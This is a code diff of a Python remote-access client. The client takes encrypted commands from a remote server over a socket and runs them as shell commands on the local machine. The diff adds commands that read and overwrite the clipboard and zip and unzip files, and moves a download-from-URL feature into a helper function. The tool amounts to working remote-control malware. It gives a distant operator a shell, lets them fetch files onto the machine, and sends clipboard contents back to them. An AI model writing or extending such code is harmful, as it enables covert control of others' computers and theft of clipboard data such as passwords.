@@ -7,11 +7,31 @@ import shutil
 import signal
 import sys
 import struct
+import pathlib
 from cryptography.fernet import Fernet
 
 commands = '\nAvaliable Modules\n'
 
-commands += '- download {url}\n'
+commands += '- download {url} (Downloads file from URL)\n'
+
+try:
+    import pyperclip
+    commands += '- key/gclip (Copys clipboard)\n'
+    commands += '- key/fclip {Text} (Fills clipboard)\n'
+    _pyperclip = True
+except Exception as e:
+    print(f'pyperclip not installed: {e}')
+    _pyperclip = False
+
+try:
+    import zipfile
+    commands += '- unzip {Zip file} (Unzips a file)\n'
+    commands += '- zip {file} ( Zips a file)\n'
+    _zipfile = True
+except Exception as e:
+    print(f'zipfile import error: {e}')
+    _zipfile = False
+
 
 class Client(object):
 
@@ -67,12 +87,64 @@ class Client(object):
             raise
         return
 
-    def print_output(self, output_str):
+    def print_output(self, output_str : str):
         """ Prints command output """
         sent_message = str.encode(self.Crypt.encrypt((output_str + str(os.getcwd()) + '> ').encode(encoding='utf-8')).decode())
         self.socket.send(struct.pack('>I', len(sent_message)) + sent_message)
         print(output_str)
         return
+
+
+    def check_custom_commands(self, data : bytes):
+        """ Check for Custom command triggers in data """
+        data = data.decode("utf-8")
+        if data[:2].lower() == 'cd':
+            directory = data[3:]
+            try:
+                os.chdir(directory.strip())
+            except Exception as e:
+                return "Could not change directory: %s\n" %str(e)
+            else: 
+                return ""
+        if data[:7].lower() == 'modules':
+            return commands
+        if data[:8].lower() == 'download':
+            try:
+                url = data[9:]
+                filename = os.path.basename(url)
+                with requests.get(url, stream=True) as r:
+                    with open(filename, 'wb') as f:
+                        shutil.copyfileobj(r.raw, f)
+            except Exception as e:
+                return f"Error downloading file {e}"
+            return 'Downloaded {0} successfully.'.format(filename)
+        if data[:9].lower() == 'key/gclip':
+            if _pyperclip:
+                return pyperclip.paste()
+            else:
+                return "key/gclip not avaliable: pyperclip import failed"
+        if data[:9].lower() == 'key/fclip':
+            if _pyperclip:
+                pyperclip.copy(data[10:])
+                return "Copied to clipboard successfully."
+            else:
+                return "key/fclip not avaliable: pyperclip import failed"
+        if data[:3].lower() == 'zip':
+            if _zipfile:
+                output_file = os.path.splitext(data[4:])[0] + ".zip"
+                zipfile.ZipFile(os.path.splitext(data[4:])[0] + ".zip", mode='w').write(data[4:])
+                return f"{data[4:]} zipped to {output_file}"
+            else:
+                return "zip not avaliable: zipfile import failed"
+        if data[:5].lower() == 'unzip':
+            if _zipfile:
+                with zipfile.ZipFile(data[6:], 'r') as f:
+                    f.extractall(pathlib.Path().absolute())
+                return f"Extracted {data[6:]} to {pathlib.Path().absolute()}"
+            else:
+                return "unzip not avaliable: zipfile import failed"
+        return None
+
 
     def receive_commands(self):
         """ Receive commands from remote server and run on local machine """
@@ -96,30 +168,14 @@ class Client(object):
             except Exception as e:
                 print(e)
                 break
-            if data[:2].decode("utf-8").lower() == 'cd':
-                directory = data[3:].decode("utf-8")
-                try:
-                    os.chdir(directory.strip())
-                except Exception as e:
-                    output_str = "Could not change directory: %s\n" %str(e)
-                else: 
-                    output_str = ""
-            elif data[:7].decode("utf-8").lower() == 'modules':
-                self.print_output(commands)
-            elif data[:8].decode("utf-8").lower() == 'download':
-                try:
-                    url = data[9:]
-                    filename = os.path.basename(url)
-                    with requests.get(url, stream=True) as r:
-                        with open(filename, 'wb') as f:
-                            shutil.copyfileobj(r.raw, f)
-                    self.print_output('Downloaded {0} successfully.'.format(filename))
-                except Exception as e:
-                    self.print_output("Error downloading file")
-            elif data[:].decode("utf-8").lower() == 'quit':
+            if data[:].decode("utf-8").lower() == 'quit':
                 self.socket.close()
                 break
-            elif len(data) > 0:
+            try:
+                output_str = self.check_custom_commands(data)
+            except Exception as e:
+                output_str = f"Custom command failed: {e}"
+            if (output_str == None) and len(data) > 0:
                 try:
                     cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -127,10 +183,10 @@ class Client(object):
                     output_str = output_bytes.decode("utf-8", errors="replace")
                 except Exception as e:
                     # TODO: Error description is lost
-                    output_str = "Command execution unsuccessful: %s\n" %str(e)
+                    output_str = "Command execution unsuccessful: %s" %str(e)
             if output_str is not None:
                 try:
-                    self.print_output(output_str)
+                    self.print_output(output_str + "\n")
                 except Exception as e:
                     print('Cannot send command output: %s' %str(e))
         self.socket.close()
